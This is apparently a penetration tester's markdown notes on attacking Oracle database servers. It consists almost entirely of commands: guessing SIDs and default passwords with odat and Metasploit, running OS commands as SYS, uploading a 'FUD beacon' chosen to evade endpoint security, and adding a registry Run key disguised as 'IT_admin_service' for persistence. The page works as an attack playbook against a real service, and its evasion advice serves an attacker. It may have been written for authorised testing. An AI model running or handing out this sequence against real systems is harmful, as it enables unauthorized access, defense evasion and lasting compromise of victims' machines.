# Oracle infrastructure Security Assessment Methodology

###  First thing to do is to Identify SIDs
```
pyton3 odat sidguesser -s 192.168.3.229 -p 7002

# Metasploit Module
msf5  > use auxiliary/admin/oracle/sid_brute
msf5 auxiliary(admin/oracle/sid_brute) > set rhost 192.168.3.229
rhost => 192.168.3.229
msf5 auxiliary(admin/oracle/sid_brute) > set rport 7002
rport => 7002
msf5 auxiliary(admin/oracle/sid_brute) > run

[*] 192.168.3.229:7002 - Starting brute force on 192.168.3.229, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[+] 192.168.3.229:7002 - 192.168.3.229:7002 Found SID 'XE
```
### Upon Identifing The SID Next thing to do is to bruteforce 
```
python3 odat.py passwordguesser -s 192.168.3.229 -p 7002 -d XE --accounts-file default_userpass.txt
```

### Basic OS Command Execution
Upon Identifying usable Credential, next step is to test an OS Command whether The credentail woork.
```
pyton3 odat.py dbmsscheduler -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba --exec "C:\windows\system32\cmd.exe /c dir C:\\Users\\ > C:\output" -vvv
pyton3 odat.py dbmsscheduler -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba --exec "C:\windows\system32\cmd.exe /c ipconfig && systeminfo\\ > C:\output" -vvv
pyton3 odat.py dbmsscheduler -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba --exec "C:\windows\system32\cmd.exe /c ipconfig && systeminfo\\ > C:\output" -vvv
```
### Execution
* dbmsadvisor Module allow us to upload 
* externaltable Module allow us to execute OS command
```
pyton3 odat dbmsadvisor -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba --putFile C:\\Windows\\\tracing Hello.txt  /root/Desktop/hello.txt
pyton3 odat.py externaltable -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --exec "dir C:/Windows/tracing" hello.txt --sysdba

#Target box is being used Window 10 which may enable one of Endpoint Solution, It is better to upload a FUD beacon to avoid being cought by Endpoint Security.
pyton3 odat dbmsadvisor -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba --putFile C:\\Windows\\\tracing\\beacon.exe  /root/Desktop/beacon.exe
pyton3 odat.py externaltable -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --exec "dir C:/Windows/tracing" beacon.exe --sysdba

```


### Persistence
```
pyton3 odat dbmsadvisor -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba --putFile C:\\Windows\\\tracing\\beacon.exe  /root/Desktop/beacon.exe
pyton3 odat.py dbmsscheduler -s 192.168.3.229 -p 7002 -d XE -U SYS -P CHANGE_ON_INSTALL --sysdba --exec "C:\windows\system32\cmd.exe /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v IT_admin_service /t REG_SZ /d "C:\Windows\tracing\beacon.exe" > C:\output" -vvv

```
